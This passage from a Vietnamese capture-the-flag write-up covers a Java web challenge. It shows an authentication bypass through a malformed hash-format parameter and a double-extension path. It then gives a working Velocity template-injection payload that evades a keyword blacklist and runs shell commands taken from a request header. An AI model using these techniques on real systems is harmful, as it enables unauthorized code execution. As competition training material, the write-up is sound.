</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ENV JAVA_TOOL_OPTIONS -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
</span></span><span class=line><span class=cl>EXPOSE 5005
</span></span></code></pre></td></tr></table></div></div><ul><li>B·ªè service nginx ƒë·ªÉ v√†o th·∫≥ng tomcat cho ti·ªán, ƒë·ªìng th·ªùi expose port 5005 ra ngo√†i</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>web:
</span></span><span class=line><span class=cl>container_name: web
</span></span><span class=line><span class=cl>build:
</span></span><span class=line><span class=cl>  context: .
</span></span><span class=line><span class=cl>  dockerfile: web/Dockerfile
</span></span><span class=line><span class=cl>volumes:
</span></span><span class=line><span class=cl>  - ./flag.txt:/flag.txt:ro
</span></span><span class=line><span class=cl>restart: unless-stopped
</span></span><span class=line><span class=cl>ports:
</span></span><span class=line><span class=cl>  - &#34;8080:8080&#34;
</span></span><span class=line><span class=cl>  - &#34;5005:5005&#34;
</span></span><span class=line><span class=cl>depends_on:
</span></span><span class=line><span class=cl>  - postgres
</span></span><span class=line><span class=cl>networks:
</span></span><span class=line><span class=cl>  - internet
</span></span><span class=line><span class=cl>  - no-internet
</span></span></code></pre></td></tr></table></div></div><ul><li>Khi ƒë√£ th·∫•y remote debug connected m√† ƒë·∫∑t breakpoint kh√¥ng ƒÉn th√¨ c√≥ th·ªÉ l√† do ch∆∞a ch·ªçn class l√† code base, ƒë·ªÉ set th√¨ m√¨nh v√†o Project Structure. T·∫°i tab Modules ch·ªçn ph·∫ßn Dependencies, th√™m folder classes v√†o v·ªõi option l√† JARs or Directories l√† oke:<br><img src=https://hackmd.io/_uploads/HktCoGueWg.png loading=lazy alt=image><br>Trong web.xml khai b√°o c√°c file truy c·∫≠p t·ª´ ƒë∆∞·ªùng d·∫´n <code>/admin</code> ƒë·ªÅu s·∫Ω ƒëi qua 2 class AuthFilter v√† WafFilter:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;filter-mapping&gt;
</span></span><span class=line><span class=cl>    &lt;filter-name&gt;AuthFilter&lt;/filter-name&gt;
</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;
</span></span><span class=line><span class=cl>&lt;/filter-mapping&gt;
</span></span><span class=line><span class=cl>&lt;filter-mapping&gt;
</span></span><span class=line><span class=cl>    &lt;filter-name&gt;WafFilter&lt;/filter-name&gt;
</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;
</span></span><span class=line><span class=cl>&lt;/filter-mapping&gt;
</span></span></code></pre></td></tr></table></div></div><p>Class AuthFilter y√™u c·∫ßu m·ªói request ƒëi v√†o ƒë·ªÅu c√≥ username v√† password, bi·∫øn format l√† c√°ch th·ª©c hash m·∫≠t kh·∫©u ƒë·ªÉ so kh·ªõp, n·∫øu kh√¥ng c√≥ m·∫∑c ƒë·ªãnh l√† sha1:<br><img src=https://hackmd.io/_uploads/ByXK6zuxZl.png loading=lazy alt=image><br>N·∫øu nh∆∞ format ƒë∆∞·ª£c truy·ªÅn v√†o th√¨ ph·∫£i n·∫±m trong <code>sha1,md5,sha256,sha512</code>, n·∫øu kh√¥ng s·∫Ω b√°o l·ªói ngay:
<img src=https://hackmd.io/_uploads/B19i6fdeZl.png loading=lazy alt=image><br>Check ch√°n ch√™ r m·ªõi ƒë·∫øn ƒëo·∫°n check th√¥ng tin ng∆∞·ªùi d√πng t·∫°i InMemoryUserDB#verifyUser:
<img src=https://hackmd.io/_uploads/Syje0G_lZe.png loading=lazy alt=image><br>H√†m n√†y check username tr∆∞·ªõc b·∫±ng c√°ch l·∫•y password c·ªßa user t∆∞∆°ng ·ª©ng. Sau ƒë√≥ so kh·ªõp m·∫≠t kh·∫©u l∆∞u tr·ªØ v·ªõi m·∫≠t kh·∫©u truy·ªÅn v√†o ƒë∆∞·ª£c hash b·∫±ng format ta ƒëi·ªÅu ch·ªânh. ƒê·ªìng th·ªùi this.users l√† m·ªôt map ch·ª©a m·ªói admin, n√™n lo·∫°i b·ªè vi·ªác crack hash:
<img src=https://hackmd.io/_uploads/ByvU0MdeWx.png loading=lazy alt=image><br>Qua 1 v√≤ng if, ti·∫øp t·ª•c ki·ªÉm tra thu·ªôc t√≠nh protect l√† true th√¨ ki·ªÉm tra role, kh√¥ng ph·∫£i admin th√¨ tr·∫£ v·ªÅ l·ªói role, cu·ªëi c√πng n·∫øu dpFilter l√† true th√¨ m·ªõi ti·∫øp t·ª•c x·ª≠ l√Ω:<br><img src=https://hackmd.io/_uploads/rknUWmOx-l.png loading=lazy alt=image><br></p><p>Thu·ªôc t√≠nh protect ƒë∆∞·ª£c set b·∫±ng logic sau:</p><ul><li>L·∫•y URI c·ªßa request, split t·ª´ng th∆∞ m·ª•c theo d·∫•u &ldquo;/&rdquo;</li><li>Set page_type m·∫∑c ƒë·ªãnh r·ªóng, n·∫øu nh∆∞ t√™n file c√≥ nhi·ªÅu h∆°n 2 d·∫•u . th√¨ l·∫•y extension sau d·∫•u ch·∫•m cu·ªëi c√πng</li><li>Check n·∫øu page_type n·∫±m trong protectedPages th√¨ set l√† true, kh√¥ng th√¨ l√† false
M·∫∑c ƒë·ªãnh truy·ªÅn v√†o file th√¥ng th∆∞·ªùng nh∆∞: /admin/index.tpl th√¨ m·∫∑c ƒë·ªãnh page_type l√† "" => chu·ªói n√†o m√† ch·∫£ contains "" n√™n m·∫∑c ƒë·ªãnh protect l√† true:
<img src=https://hackmd.io/_uploads/SJXgZXOx-l.png loading=lazy alt=image><br>Nh∆∞ v·∫≠y, ƒë·ªÉ bypass auth th√¨ ph·∫£i kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ doFilter l√† false, ƒë·ªÉ l√†m ƒë∆∞·ª£c ƒëi·ªÅu ƒë√≥ th√¨:</li></ul><p><em><strong>Bypass verifyUser</strong></em></p><p>Debug k·ªπ h∆°n, ta th·∫•y v√≤ng if ƒë·∫ßu c√≥ block try/catch, m√† n·∫øu nh∆∞ r∆°i v√†o catch th√¨ doFilter s·∫Ω kh√¥ng b·ªã set th√†nh false:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>username</span> <span class=o>!=</span> <span class=n>null</span> <span class=o>&amp;&amp;</span> <span class=n>password</span> <span class=o>!=</span> <span class=n>null</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=ne>String</span> <span class=n>format</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>getParameter</span><span class=p>(</span><span class=s2>&#34;format&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>format</span> <span class=o>==</span> <span class=n>null</span> <span class=o>||</span> <span class=n>format</span><span class=o>.</span><span class=n>isEmpty</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>format</span> <span class=o>=</span> <span class=s2>&#34;sha1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=s2>&#34;sha1,md5,sha256,sha512&#34;</span><span class=o>.</span><span class=n>contains</span><span class=p>(</span><span class=n>format</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;format does not support&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>doFilter</span> <span class=o>=</span> <span class=bp>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>resp</span><span class=o>.</span><span class=n>sendRedirect</span><span class=p>(</span><span class=s2>&#34;/home/_error.page?errorMsg=&#34;</span> <span class=o>+</span> <span class=n>URLEncoder</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span> <span class=n>StandardCharsets</span><span class=o>.</span><span class=n>UTF_8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>boolean</span> <span class=n>auth</span> <span class=o>=</span> <span class=n>this</span><span class=o>.</span><span class=n>userDB</span><span class=o>.</span><span class=n>verifyUser</span><span class=p>(</span><span class=n>username</span><span class=p>,</span> <span class=n>password</span><span class=p>,</span> <span class=n>format</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>auth</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=o>...</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=ne>String</span> <span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;auth failed1!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=n>doFilter</span> <span class=o>=</span> <span class=bp>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=n>resp</span><span class=o>.</span><span class=n>sendRedirect</span><span class=p>(</span><span class=s2>&#34;/home/_error.page?errorMsg=&#34;</span> <span class=o>+</span> <span class=n>URLEncoder</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span> <span class=n>StandardCharsets</span><span class=o>.</span><span class=n>UTF_8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=n>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>var17</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=ne>String</span> <span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;auth failed2!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>doFilter</span> <span class=o>=</span> <span class=bp>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>resp</span><span class=o>.</span><span class=n>sendRedirect</span><span class=p>(</span><span class=s2>&#34;/home/_error.page?errorMsg=&#34;</span> <span class=o>+</span> <span class=n>URLEncoder</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span> <span class=n>StandardCharsets</span><span class=o>.</span><span class=n>UTF_8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=n>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>var18</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>var18</span><span class=o>.</span><span class=n>printStackTrace</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=n>out</span><span class=o>.</span><span class=n>println</span><span class=p>(</span><span class=s2>&#34;error trying to authenticate: &#34;</span> <span class=o>+</span> <span class=n>var18</span><span class=o>.</span><span class=n>getMessage</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>C√¢u h·ªèi l√† l√†m th·∫ø n√†o ƒë·ªÉ raise Exception var18 m√† kh√¥ng b·ªã r∆°i v√†o c√°c exception kh√°c? C√¢u tr·∫£ l·ªùi s·∫Ω n·∫±m ·ªü bi·∫øn format, ƒëo·∫°n ki·ªÉm tra ƒë·∫ßu v√†o c·ªßa format c√≥ v·∫•n ƒë·ªÅ, c·ª• th·ªÉ l√† d√≤ng:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>if (!&#34;sha1,md5,sha256,sha512&#34;.contains(format))
</span></span></code></pre></td></tr></table></div></div><p>Gi√° tr·ªã ƒë∆∞·ª£c check ƒë·ªÉ <strong>contains</strong> trong chu·ªói kia, n·∫øu nh∆∞ ta truy·ªÅn v√†o <code>,sha512</code> th√¨ sao?
ƒêo·∫°n check if contains s·∫Ω ƒë∆∞·ª£c pass, ch∆∞∆°ng tr√¨nh g·ªçi ƒë·∫øn verifyUser:
<img src=https://hackmd.io/_uploads/SyljEX_g-x.png loading=lazy alt=image><br>T·∫°i ƒë√¢y m·∫≠t kh·∫©u ƒë∆∞·ª£c l·∫•y t·ª´ user t∆∞∆°ng ·ª©ng, kh√¥ng s·∫Ω return false => auth failed1! N√™n username truy·ªÅn v√†o c·∫ßn ph·∫£i l√† <code>admin</code>. H√†m check ti·∫øp t·ª•c nh·∫£y v√†o h√†m hashPassword:
<img src=https://hackmd.io/_uploads/BkIyVQOlZl.png loading=lazy alt=image><br>H√†m hashPassword s·∫Ω check format truy·ªÅn v√†o c√≥ ph·∫£i m·ªôt thu·∫≠t to√°n hash h·ª£p l·ªá trong MessageDigest kh√¥ng:
<img src=https://hackmd.io/_uploads/Bk_W4QOgZl.png loading=lazy alt=image><br>Do <code>,sha512</code> kh√¥ng valid n√™n s·∫Ω raise exception <code>,sha512 MessageDigest not available</code>, t·ª´ ƒë√≥ bypass ƒë∆∞·ª£c ƒëo·∫°n whitelist if ƒë·∫ßu:
<img src=https://hackmd.io/_uploads/HyOGVXdlWe.png loading=lazy alt=image><br><em><strong>Set protect = false</strong></em></p><p>Xem l·∫°i web.xml, c√°c file c√≥ extension nh∆∞ sau ƒë∆∞·ª£c handle b·ªüi class EditContentParser</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;servlet&gt;
</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;EditContentParser&lt;/servlet-name&gt;
</span></span><span class=line><span class=cl>    &lt;servlet-class&gt;io.breach.EditContentParser&lt;/servlet-class&gt;
</span></span><span class=line><span class=cl>&lt;/servlet&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;servlet-mapping&gt;
</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;EditContentParser&lt;/servlet-name&gt;
</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;*.groovy&lt;/url-pattern&gt;
</span></span><span class=line><span class=cl>&lt;/servlet-mapping&gt;
</span></span><span class=line><span class=cl>&lt;servlet-mapping&gt;
</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;EditContentParser&lt;/servlet-name&gt;
</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;*.page&lt;/url-pattern&gt;
</span></span><span class=line><span class=cl>&lt;/servlet-mapping&gt;
</span></span><span class=line><span class=cl>&lt;servlet-mapping&gt;
</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;EditContentParser&lt;/servlet-name&gt;
</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;*.tpl&lt;/url-pattern&gt;
</span></span><span class=line><span class=cl>&lt;/servlet-mapping&gt;
</span></span><span class=line><span class=cl>&lt;servlet-mapping&gt;
</span></span><span class=line><span class=cl>    &lt;servlet-name&gt;EditContentParser&lt;/servlet-name&gt;
</span></span><span class=line><span class=cl>    &lt;url-pattern&gt;*.htm&lt;/url-pattern&gt;
</span></span><span class=line><span class=cl>&lt;/servlet-mapping&gt;
</span></span></code></pre></td></tr></table></div></div><p>Khi g·∫∑p c√°c file n√†y, class call method service, th·ª±c hi·ªán parse URI ƒë·ªÉ l·∫•y ra t√™n file c·∫ßn hi·ªÉn th·ªã. Nh∆∞ng v·∫•n l√† ·ªü ƒë√¢y page_type l·∫°i ƒë∆∞·ª£c l·∫•y l√† ph·∫ßn t·ª≠ ti√™n sau d·∫•u ch·∫•m, ng∆∞·ª£c l·∫°i v·ªõi logic x·ª≠ l√Ω <code>protect</code>:
<img src=https://hackmd.io/_uploads/rkWIDQOxZe.png loading=lazy alt=image><br>ƒê·ªÉ <code>protect</code> l√† false, ta c·∫ßn ph·∫£i truy·ªÅn v√†o file c√≥ 2 extension:</p><ul><li>Extension th·ª© 2 kh√¥ng ph·∫£i l√† groovy => page, tpl, htm ƒë·ªÅu ƒë∆∞·ª£c</li><li>Extension th·ª© nh·∫•t l√† extension ƒë√∫ng c·ªßa file c·∫ßn truy c·∫≠p</li></ul><p>K·∫øt h·ª£p c·∫£ 2 ƒëi·ªÅu ki·ªán, ta c√≥ request bypass authen ƒë·ªÉ truy c·∫≠p file /admin/index.html:
<img src=https://hackmd.io/_uploads/SybIOXdeWg.png loading=lazy alt=image><br></p><h4 id=ssti-in-velocity>SSTI In Velocity</h4><p>Trong c√°c file c√≥ th·ªÉ truy c·∫≠p, t·ªìn t·∫°i editPage.groovy cho ph√©p t·∫°o file .page c√≥ n·ªôi dung t√πy √Ω truy c·∫≠p ƒë∆∞·ª£c t·ª´ webroot => SSTI Velocity:
<img src=https://hackmd.io/_uploads/Sk_ktm_xWg.png loading=lazy alt=image><br>V·∫•n ƒë·ªÅ c√≤n l·∫°i l√† bypass ƒë·ªëng blacklist n√†y n·ªØa th√¥i:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>private</span> <span class=k>static</span> <span class=n>final</span> <span class=n>List</span><span class=o>&lt;</span><span class=ne>String</span><span class=o>&gt;</span> <span class=n>BLACKLIST</span> <span class=o>=</span> <span class=n>Arrays</span><span class=o>.</span><span class=n>asList</span><span class=p>(</span><span class=s2>&#34;runtime&#34;</span><span class=p>,</span> <span class=s2>&#34;processbuilder&#34;</span><span class=p>,</span> <span class=s2>&#34;eval&#34;</span><span class=p>,</span> <span class=s2>&#34;forName&#34;</span><span class=p>,</span> <span class=s2>&#34;scriptEngine&#34;</span><span class=p>,</span> <span class=s2>&#34;parse&#34;</span><span class=p>,</span> <span class=s2>&#34;include&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>private</span> <span class=n>boolean</span> <span class=n>containsBlacklisted</span><span class=p>(</span><span class=ne>String</span> <span class=n>input</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>input</span> <span class=o>==</span> <span class=n>null</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=ne>String</span> <span class=n>lower</span> <span class=o>=</span> <span class=n>input</span><span class=o>.</span><span class=n>toLowerCase</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>Iterator</span> <span class=n>var3</span> <span class=o>=</span> <span class=n>BLACKLIST</span><span class=o>.</span><span class=n>iterator</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=ne>String</span> <span class=n>forbidden</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>var3</span><span class=o>.</span><span class=n>hasNext</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=bp>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>forbidden</span> <span class=o>=</span> <span class=p>(</span><span class=ne>String</span><span class=p>)</span><span class=n>var3</span><span class=o>.</span><span class=n>next</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>while</span><span class=p>(</span><span class=o>!</span><span class=n>lower</span><span class=o>.</span><span class=n>contains</span><span class=p>(</span><span class=n>forbidden</span><span class=o>.</span><span class=n>toLowerCase</span><span class=p>()));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ƒêa s·ªë c√°c payload Velocity SSTI ƒë·ªÅu d√πng forName ƒë·ªÉ call class, ƒë·ªÉ bypass th√¨ m√¨nh ƒë√£ ch·ªçn s·ª≠ d·ª•ng classloader. Sau m·ªôt h·ªìi fuzz t√πm lum, m√¨nh t√¨m ƒë∆∞·ª£c object $request ch·ª©a instance c·ªßa class RequestFacade:<br><img src=https://hackmd.io/_uploads/H1DecXOlbe.png loading=lazy alt=image><br>T·ª´ ƒë√¢y c√≥ th·ªÉ call ƒë·∫øn object URLClassLoader th√¥ng qua payload <code>$request.servletContext.class.classLoader</code>:
<img src=https://hackmd.io/_uploads/BJH497ugZe.png loading=lazy alt=image><br>Vi·ªác kh√≥ ƒë√£ l√†m ƒë∆∞·ª£c, gi·ªù m√¨nh s·∫Ω d√πng n√≥ ƒë·ªÉ load class java.lang.Runtime, l·∫•y command t·ª´ header 1337:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1>#set($cl = $request.servletContext.class.classLoader)</span>
</span></span><span class=line><span class=cl><span class=c1>#set($rt = $cl.loadClass(&#34;java.lang.Run&#34;+&#34;time&#34;))</span>
</span></span><span class=line><span class=cl><span class=c1>#set($g = $rt.getMethod(&#34;getR&#34;+&#34;untime&#34;,null))</span>
</span></span><span class=line><span class=cl><span class=c1>#set($r = $g.invoke(null,null))</span>
</span></span><span class=line><span class=cl><span class=c1>#set($cmd = $request.getHeader(&#34;1337&#34;))</span>
</span></span><span class=line><span class=cl><span class=c1>#set($exec = $rt.getMethod(&#34;exec&#34;,$cl.loadClass(&#34;java.lang.String&#34;)))</span>
</span></span><span class=line><span class=cl><span class=c1>#set($p = $exec.invoke($r,$cmd))</span>
</span></span><span class=line><span class=cl><span class=c1>#set($is = $p.getInputStream())</span>
</span></span><span class=line><span class=cl><span class=c1>#set($scClass = $cl.loadClass(&#34;java.util.Scanner&#34;))</span>
</span></span><span class=line><span class=cl><span class=c1>#set($sc = $scClass.getConstructor($cl.loadClass(&#34;java.io.InputStream&#34;)).newInstance($is))</span>
</span></span><span class=line><span class=cl><span class=c1>#set($del = $scClass.getMethod(&#34;useDelimiter&#34;, $cl.loadClass(&#34;java.lang.String&#34;)))</span>
</span></span><span class=line><span class=cl><span class=c1>#set($tmp = $del.invoke($sc, &#34;\\A&#34;))</span>
</span></span><span class=line><span class=cl><span class=c1>#set($next = $scClass.getMethod(&#34;next&#34;))</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>next</span><span class=o>.</span><span class=n>invoke</span><span class=p>(</span><span class=o>$</span><span class=n>sc</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/r1VF57_g-e.png loading=lazy alt=image><br>Finally, RCE:<br><img src=https://hackmd.io/_uploads/rkD95Xdx-g.png loading=lazy alt=image><br>ƒê·ªõp flag tr√™n server:<br><img src=https://hackmd.io/_uploads/r13xo7ugbl.png loading=lazy alt=image><br>Ra ƒë·∫øn b∆∞·ªõc n√†y th√¨ cu·ªôc thi c≈©ng k·∫øt th√∫c r·ªìi, th√¥i th√¨ +1 ki·∫øn th·ª©c v·∫≠y</p><h2 id=k·∫øt-th√∫c>K·∫øt th√∫c</h2><p>Trong kho·∫£ng th·ªùi gian 8 ti·∫øng, ngo√†i challenge web2 th√¨ m√¨nh c√≥ v·ªçc Lucky Star n·ªØa m√† kh√¥ng confirm ƒë∆∞·ª£c ƒë√£ RCE con Sharepoint hay ch∆∞a, coi nh∆∞ l√† t·ªën th√™m th·ªùi gian m√† kh√¥ng c√≥ th√†nh qu·∫£ g√¨.
Ng·∫≠m ng√πi k·∫øt th√∫c ·ªü v·ªã tr√≠ th·ª© 6, m√¨nh c≈©ng ch·ªâ bi·∫øt t·ª± tr√°ch b·∫£n th√¢n th√¥i üóø
<img src=https://hackmd.io/_uploads/S1PUdlulZx.png loading=lazy alt=image><br>ƒê√¢y l√† b√†i h·ªçc cho b·∫£n th√¢n v·ªÅ vi·ªác kh√¥ng chu·∫©n b·ªã kƒ© tr∆∞·ªõc m·ªôt format thi m·ªõi, c≈©ng nh∆∞ s·ª± thi·∫øu quy·∫øt ƒëo√°n khi s·ª≠ d·ª•ng tool unshield,&mldr; d·∫´n ƒë·∫øn k·∫øt qu·∫£ kh√¥ng nh∆∞ mong mu·ªën. Hi v·ªçng r·∫±ng c√°c kh√≥a sau s·∫Ω kh√¥ng m·∫Øc ph·∫£i sai l·∫ßm nh∆∞ m√¨nh n·ªØa.</p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
